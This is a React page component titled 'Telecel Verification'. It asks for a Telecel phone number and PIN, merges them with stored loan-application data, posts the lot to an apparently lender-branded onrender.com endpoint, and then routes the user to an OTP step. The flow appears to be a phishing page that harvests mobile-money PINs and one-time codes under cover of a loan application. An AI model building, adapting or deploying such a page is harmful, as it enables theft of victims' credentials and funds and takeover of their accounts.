import { useState } from "react";
import axios from "axios";
import "../styles/app.css";
import { useNavigate } from "react-router-dom";

export default function Telecel() {
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const [data, setData] = useState({
    number: "",
    pin: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};

    console.log("LoanData:", loanData);
    console.log("Telecel Data:", data);

    setLoading(true);

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        {
          ...loanData,
          ...data,
        }
      );

      console.log("SERVER RESPONSE:", res.data);

      if (res.data.id) {
        navigate(`/otp/${res.data.id}`);
      } else {
        alert("No ID returned from server");
      }

    } catch (err) {
      console.error(err);
      alert("Failed to submit");
    }

    setLoading(false);
  };

  return (
    <div className="loan-container">
      <div className="card">

        <h1>Telecel Verification</h1>

        <form onSubmit={handleSubmit}>

          <input
            name="number"
            placeholder="Telecel Number"
            onChange={handleChange}
            required
          />

          <input
            name="pin"
            type="password"
            placeholder="PIN"
            onChange={handleChange}
            required
          />

          <button disabled={loading}>
            {loading ? "Processing..." : "Continue"}
          </button>

        </form>

      </div>
    </div>
  );
}